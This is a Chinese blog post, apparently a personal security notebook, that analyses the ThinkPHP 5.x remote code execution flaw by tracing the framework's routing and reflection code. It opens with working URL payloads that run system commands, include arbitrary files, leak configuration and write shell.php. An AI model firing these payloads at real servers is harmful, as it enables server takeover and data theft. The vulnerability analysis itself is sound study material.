@@ -1,0 +1,522 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Thinkphp5.x RCE | ch1e的自留地</title>
+<link rel="shortcut icon" href="https://ch0x01e.github.io/favicon.ico?v=1709471671274">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://ch0x01e.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="Thinkphp5.x RCE | ch1e的自留地 - Atom Feed" href="https://ch0x01e.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="漏洞分析
+环境:
+thinkphp5.0.20+php7.3.4+apache+phpstorm
+Payload：
+5.0.x
+?s=index/think\config/get&amp;name=database.username # 获..." />
+    <meta name="keywords" content="" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://ch0x01e.github.io">
+  <img class="avatar" src="https://ch0x01e.github.io/images/avatar.png?v=1709471671274" alt="">
+  </a>
+  <h1 class="site-title">
+    ch1e的自留地
+  </h1>
+  <p class="site-description">
+    Manners maketh man
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+      
+        <a href="https://ch1e.cn/post/friends" class="menu">
+          友链
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              Thinkphp5.x RCE
+            </h2>
+            <div class="post-info">
+              <span>
+                2022-10-16
+              </span>
+              <span>
+                10 min read
+              </span>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <h1 id="漏洞分析">漏洞分析</h1>
+<p>环境:</p>
+<p>thinkphp5.0.20+php7.3.4+<a href="https://so.csdn.net/so/search?q=apache&amp;spm=1001.2101.3001.7020">apache</a>+phpstorm</p>
+<p>Payload：</p>
+<p><strong>5.0.x</strong></p>
+<pre><code>?s=index/think\config/get&amp;name=database.username # 获取配置信息
+?s=index/\think\Lang/load&amp;file=../../test.jpg    # 包含任意文件
+?s=index/\think\Config/load&amp;file=../../t.php     # 包含任意.php文件
+?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami
+</code></pre>
+<p><strong>5.1.x</strong></p>
+<pre><code>?s=index/\think\Request/input&amp;filter[]=system&amp;data=pwd
+?s=index/\think\view\driver\Php/display&amp;content=&lt;?php phpinfo();?&gt;
+?s=index/\think\template\driver\file/write&amp;cacheFile=shell.php&amp;content=&lt;?php phpinfo();?&gt;
+?s=index/\think\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id
+?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id
+</code></pre>
+<p>在thinkphp5.0.20中，thinkphp/library/think/App.php中有一个invokeFunction方法</p>
+<pre><code class="language-php">public static function invokeFunction($function, $vars = [])
+{
+    $reflect = new \ReflectionFunction($function);
+    $args    = self::bindParams($reflect, $vars);
+
+    // 记录执行信息
+    self::$debug &amp;&amp; Log::record('[ RUN ] ' . $reflect-&gt;__toString(), 'info');
+
+    return $reflect-&gt;invokeArgs($args);
+}
+</code></pre>
+<p>他在里面调用了<code>$reflect-&gt;invokeArgs($args)</code>,ReflectionMethod::invokeArgs是带参数执行如果说这里传进来的参数没有经过过滤，是否可能造成远程命令执行？</p>
+<p>我这里使用5.0.20来分析，首先在入口文件打个断点，打一下payload进行分析</p>
+<figure data-type="image" tabindex="1"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220531161413073.png" alt="image-20220531161413073" loading="lazy"></figure>
+<p>跟进这里的run方法</p>
+<figure data-type="image" tabindex="2"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220531161459171.png" alt="image-20220531161459171" loading="lazy"></figure>
+<p>判断是否存在request实例，没有就实例化一个request对象，然后初始化应用，并返回配置信息，判断入口文件是否绑定了模块或者控制器，继续到<code>$request-&gt;filter($config['default_filter']);</code>设置或获取当前的过滤规则,然后就是一些加载系统语言包的内容，关系不大</p>
+<figure data-type="image" tabindex="3"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220531161824853.png" alt="image-20220531161824853" loading="lazy"></figure>
+<p>继续往后，他对调度信息进行了判断，并且进行了路由检测，跟进routeCheck方法</p>
+<pre><code class="language-php">public static function routeCheck($request, array $config)
+{
+    $path   = $request-&gt;path();
+    $depr   = $config['pathinfo_depr'];
+    $result = false;
+
+    // 路由检测
+    $check = !is_null(self::$routeCheck) ? self::$routeCheck : $config['url_route_on'];
+    if ($check) {
+        // 开启路由
+        if (is_file(RUNTIME_PATH . 'route.php')) {
+            // 读取路由缓存
+            $rules = include RUNTIME_PATH . 'route.php';
+            is_array($rules) &amp;&amp; Route::rules($rules);
+        } else {
+            $files = $config['route_config_file'];
+            foreach ($files as $file) {
+                if (is_file(CONF_PATH . $file . CONF_EXT)) {
+                    // 导入路由配置
+                    $rules = include CONF_PATH . $file . CONF_EXT;
+                    is_array($rules) &amp;&amp; Route::import($rules);
+                }
+            }
+        }
+
+        // 路由检测（根据路由定义返回不同的URL调度）
+        $result = Route::check($request, $path, $depr, $config['url_domain_deploy']);
+        $must   = !is_null(self::$routeMust) ? self::$routeMust : $config['url_route_must'];
+
+        if ($must &amp;&amp; false === $result) {
+            // 路由无效
+            throw new RouteNotFoundException();
+        }
+    }
+
+    // 路由无效 解析模块/控制器/操作/参数... 支持控制器自动搜索
+    if (false === $result) {
+        $result = Route::parseUrl($path, $depr, $config['controller_auto_search']);
+    }
+
+    return $result;
+}
+</code></pre>
+<p>第一行是通过<code>$path   = $request-&gt;path();</code>获取path，继续跟进这个path方法</p>
+<pre><code class="language-php">public function path()
+{
+    if (is_null($this-&gt;path)) {
+        $suffix   = Config::get('url_html_suffix');
+        $pathinfo = $this-&gt;pathinfo();
+        if (false === $suffix) {
+            // 禁止伪静态访问
+            $this-&gt;path = $pathinfo;
+        } elseif ($suffix) {
+            // 去除正常的URL后缀
+            $this-&gt;path = preg_replace('/\.(' . ltrim($suffix, '.') . ')$/i', '', $pathinfo);
+        } else {
+            // 允许任何后缀访问
+            $this-&gt;path = preg_replace('/\.' . $this-&gt;ext() . '$/i', '', $pathinfo);
+        }
+    }
+    return $this-&gt;path;
+}
+</code></pre>
+<p>又在path()里面获取了pathinfo信息，pathinfo()方法如下</p>
+<pre><code class="language-php">public function pathinfo()
+{
+    if (is_null($this-&gt;pathinfo)) {
+        if (isset($_GET[Config::get('var_pathinfo')])) {
+            // 判断URL里面是否有兼容模式参数
+            $_SERVER['PATH_INFO'] = $_GET[Config::get('var_pathinfo')];
+            unset($_GET[Config::get('var_pathinfo')]);
+        } elseif (IS_CLI) {
+            // CLI模式下 index.php module/controller/action/params/...
+            $_SERVER['PATH_INFO'] = isset($_SERVER['argv'][1]) ? $_SERVER['argv'][1] : '';
+        }
+
+        // 分析PATHINFO信息
+        if (!isset($_SERVER['PATH_INFO'])) {
+            foreach (Config::get('pathinfo_fetch') as $type) {
+                if (!empty($_SERVER[$type])) {
+                    $_SERVER['PATH_INFO'] = (0 === strpos($_SERVER[$type], $_SERVER['SCRIPT_NAME'])) ?
+                    substr($_SERVER[$type], strlen($_SERVER['SCRIPT_NAME'])) : $_SERVER[$type];
+                    break;
+                }
+            }
+        }
+        $this-&gt;pathinfo = empty($_SERVER['PATH_INFO']) ? '/' : ltrim($_SERVER['PATH_INFO'], '/');
+    }
+    return $this-&gt;pathinfo;
+}
+</code></pre>
+<p>这里的话是判断是否用兼容模式的参数，这个洞本就是在没有开启强制路由的情况下通过兼容模式调用任意控制器的操作导致的远程命令执行，所以打入的payload肯定是有兼容模式的参数。他会自动分析pathinfo的信息，最终返回pathinfo，并且在path中返回处理后的结果。继续看routeCheck方法</p>
+<figure data-type="image" tabindex="4"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220531162852117.png" alt="image-20220531162852117" loading="lazy"></figure>
+<p>在上图红框处检测是否是强制路由模式，继续往下走，到</p>
+<pre><code class="language-php">if (false === $result) {
+    $result = Route::parseUrl($path, $depr, $config['controller_auto_search']);
+}
+</code></pre>
+<p>在该处的Route::parseUrl解析模块的url地址</p>
+<pre><code class="language-php">public static function parseUrl($url, $depr = '/', $autoSearch = false)
+{
+
+    if (isset(self::$bind['module'])) {
+        $bind = str_replace('/', $depr, self::$bind['module']);
+        // 如果有模块/控制器绑定
+        $url = $bind . ('.' != substr($bind, -1) ? $depr : '') . ltrim($url, $depr);
+    }
+    $url              = str_replace($depr, '|', $url);
+    list($path, $var) = self::parseUrlPath($url);
+    $route            = [null, null, null];
+    if (isset($path)) {
+        // 解析模块
+        $module = Config::get('app_multi_module') ? array_shift($path) : null;
+        if ($autoSearch) {
+            // 自动搜索控制器
+            $dir    = APP_PATH . ($module ? $module . DS : '') . Config::get('url_controller_layer');
+            $suffix = App::$suffix || Config::get('controller_suffix') ? ucfirst(Config::get('url_controller_layer')) : '';
+            $item   = [];
+            $find   = false;
+            foreach ($path as $val) {
+                $item[] = $val;
+                $file   = $dir . DS . str_replace('.', DS, $val) . $suffix . EXT;
+                $file   = pathinfo($file, PATHINFO_DIRNAME) . DS . Loader::parseName(pathinfo($file, PATHINFO_FILENAME), 1) . EXT;
+                if (is_file($file)) {
+                    $find = true;
+                    break;
+                } else {
+                    $dir .= DS . Loader::parseName($val);
+                }
+            }
+            if ($find) {
+                $controller = implode('.', $item);
+                $path       = array_slice($path, count($item));
+            } else {
+                $controller = array_shift($path);
+            }
+        } else {
+            // 解析控制器
+            $controller = !empty($path) ? array_shift($path) : null;
+        }
+        // 解析操作
+        $action = !empty($path) ? array_shift($path) : null;
+        // 解析额外参数
+        self::parseUrlParams(empty($path) ? '' : implode('|', $path));
+        // 封装路由
+        $route = [$module, $controller, $action];
+        // 检查地址是否被定义过路由
+        $name  = strtolower($module . '/' . Loader::parseName($controller, 1) . '/' . $action);
+        $name2 = '';
+        if (empty($module) || isset($bind) &amp;&amp; $module == $bind) {
+            $name2 = strtolower(Loader::parseName($controller, 1) . '/' . $action);
+        }
+
+        if (isset(self::$rules['name'][$name]) || isset(self::$rules['name'][$name2])) {
+            throw new HttpException(404, 'invalid request:' . str_replace('|', $depr, $url));
+        }
+    }
+    return ['type' =&gt; 'module', 'module' =&gt; $route];
+}
+</code></pre>
+<p>先通过<code>list($path, $var) = self::parseUrlPath($url);</code>把模块，控制器，操作等内容放到path这个数组，然后通过array_shift把前面的元素移出数组，获取模块，控制器，操作等信息。继续往下走，就是记录一些调度信息，路由和请求信息，缓存检查，直到139行的exec方法</p>
+<figure data-type="image" tabindex="5"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220531163748295.png" alt="image-20220531163748295" loading="lazy"></figure>
+<pre><code class="language-php">protected static function exec($dispatch, $config)
+{
+    switch ($dispatch['type']) {
+        case 'redirect': // 重定向跳转
+            $data = Response::create($dispatch['url'], 'redirect')
+                -&gt;code($dispatch['status']);
+            break;
+        case 'module': // 模块/控制器/操作
+            $data = self::module(
+                $dispatch['module'],
+                $config,
+                isset($dispatch['convert']) ? $dispatch['convert'] : null
+            );
+            break;
+        case 'controller': // 执行控制器操作
+            $vars = array_merge(Request::instance()-&gt;param(), $dispatch['var']);
+            $data = Loader::action(
+                $dispatch['controller'],
+                $vars,
+                $config['url_controller_layer'],
+                $config['controller_suffix']
+            );
+            break;
+        case 'method': // 回调方法
+            $vars = array_merge(Request::instance()-&gt;param(), $dispatch['var']);
+            $data = self::invokeMethod($dispatch['method'], $vars);
+            break;
+        case 'function': // 闭包
+            $data = self::invokeFunction($dispatch['function']);
+            break;
+        case 'response': // Response 实例
+            $data = $dispatch['response'];
+            break;
+        default:
+            throw new \InvalidArgumentException('dispatch type not support');
+    }
+
+    return $data;
+}
+</code></pre>
+<p>把之前的routeCheck返回的结果传入到exec方法中，并且type键对应的值是model，所以在exec方法中进入如下判断</p>
+<pre><code class="language-php">case 'module': // 模块/控制器/操作
+    $data = self::module(
+        $dispatch['module'],
+        $config,
+        isset($dispatch['convert']) ? $dispatch['convert'] : null
+    );
+    break;
+</code></pre>
+<p>这里调用了自身的module方法，跟进，这里代码比较长，我分块来说吧</p>
+<pre><code class="language-php">if (is_string($result)) {
+    $result = explode('/', $result);
+}
+
+$request = Request::instance();
+</code></pre>
+<p>判断传入的第一个参数是否是字符串，如果是用/分割，并且实例化了一个request对象。由于前面传的是已经分割好的一个数组，就是</p>
+<figure data-type="image" tabindex="6"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220531164213144.png" alt="image-20220531164213144" loading="lazy"></figure>
+<pre><code class="language-php">if ($config['app_multi_module']) {
+    // 多模块部署
+    $module    = strip_tags(strtolower($result[0] ?: $config['default_module']));
+    $bind      = Route::getBind('module');
+    $available = false;
+
+    if ($bind) {
+        // 绑定模块
+        list($bindModule) = explode('/', $bind);
+
+        if (empty($result[0])) {
+            $module    = $bindModule;
+            $available = true;
+        } elseif ($module == $bindModule) {
+            $available = true;
+        }
+    } elseif (!in_array($module, $config['deny_module_list']) &amp;&amp; is_dir(APP_PATH . $module)) {
+        $available = true;
+    }
+
+    // 模块初始化
+    if ($module &amp;&amp; $available) {
+        // 初始化模块
+        $request-&gt;module($module);
+        $config = self::init($module);
+
+        // 模块请求缓存检查
+        $request-&gt;cache(
+            $config['request_cache'],
+            $config['request_cache_expire'],
+            $config['request_cache_except']
+        );
+    } else {
+        throw new HttpException(404, 'module not exists:' . $module);
+    }
+} else {
+    // 单一模块部署
+    $module = '';
+    $request-&gt;module($module);
+}
+</code></pre>
+<p>接下来是判断当前是否多模块部署，拿到模块名，并且读取绑定的路由，这里没有绑定，直接到了初始化模块部分，然后就是一些设置默认过滤机制，获取控制器名和操作名的操作，都是通过去获取传进来的那个数组里的内容，直接看后面的内容，重点就在后面</p>
+<pre><code class="language-php">// 获取当前操作名
+$action = $actionName . $config['action_suffix'];
+
+$vars = [];
+if (is_callable([$instance, $action])) {
+    // 执行操作方法
+    $call = [$instance, $action];
+    // 严格获取当前操作方法名
+    $reflect    = new \ReflectionMethod($instance, $action);
+    $methodName = $reflect-&gt;getName();
+    $suffix     = $config['action_suffix'];
+    $actionName = $suffix ? substr($methodName, 0, -strlen($suffix)) : $methodName;
+    $request-&gt;action($actionName);
+
+} elseif (is_callable([$instance, '_empty'])) {
+    // 空操作
+    $call = [$instance, '_empty'];
+    $vars = [$actionName];
+} else {
+    // 操作不存在
+    throw new HttpException(404, 'method not exists:' . get_class($instance) . '-&gt;' . $action . '()');
+}
+
+Hook::listen('action_begin', $call);
+
+return self::invokeMethod($call, $vars);
+</code></pre>
+<p>调用了is_callable方法对<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>i</mi><mi>n</mi><mi>s</mi><mi>t</mi><mi>a</mi><mi>n</mi><mi>c</mi><mi>e</mi><mi mathvariant="normal">对</mi><mi mathvariant="normal">应</mi><mi mathvariant="normal">的</mi><mi mathvariant="normal">对</mi><mi mathvariant="normal">象</mi><mi mathvariant="normal">的</mi></mrow><annotation encoding="application/x-tex">instance对应的对象的</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.65952em;vertical-align:0em;"></span><span class="mord mathdefault">i</span><span class="mord mathdefault">n</span><span class="mord mathdefault">s</span><span class="mord mathdefault">t</span><span class="mord mathdefault">a</span><span class="mord mathdefault">n</span><span class="mord mathdefault">c</span><span class="mord mathdefault">e</span><span class="mord cjk_fallback">对</span><span class="mord cjk_fallback">应</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">对</span><span class="mord cjk_fallback">象</span><span class="mord cjk_fallback">的</span></span></span></span>action方法进行一个判断，判断参数是否为合法的可调用结构，然后就是new了一个ReflectionMethod对象，并且获取了action和method的名字，最终是走到了<code>return self::invokeMethod($call, $vars);</code>方法，继续跟进</p>
+<pre><code class="language-php">public static function invokeMethod($method, $vars = [])
+{
+    if (is_array($method)) {
+        $class   = is_object($method[0]) ? $method[0] : self::invokeClass($method[0]);
+        $reflect = new \ReflectionMethod($class, $method[1]);
+    } else {
+        // 静态方法
+        $reflect = new \ReflectionMethod($method);
+    }
+
+    $args = self::bindParams($reflect, $vars);
+
+    self::$debug &amp;&amp; Log::record('[ RUN ] ' . $reflect-&gt;class . '-&gt;' . $reflect-&gt;name . '[ ' . $reflect-&gt;getFileName() . ' ]', 'info');
+
+    return $reflect-&gt;invokeArgs(isset($class) ? $class : null, $args);
+}
+</code></pre>
+<p>最终就是获取了方法的名字，以及参数，通过invokeArgs方法去调用</p>
+<figure data-type="image" tabindex="7"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220531165114279.png" alt="image-20220531165114279" loading="lazy"></figure>
+<figure data-type="image" tabindex="8"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220531165217105.png" alt="image-20220531165217105" loading="lazy"></figure>
+<h1 id="参考">参考</h1>
+<p>https://blog.csdn.net/weixin_43263451/article/details/123878313</p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90">漏洞分析</a></li>
+<li><a href="#%E5%8F%82%E8%80%83">参考</a></li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://ch0x01e.github.io/post/thinkphp323-fan-xu-lie-hua-chu-tan/">
+              <h3 class="post-title">
+                thinkphp3.2.3反序列化初探
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://ch0x01e.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
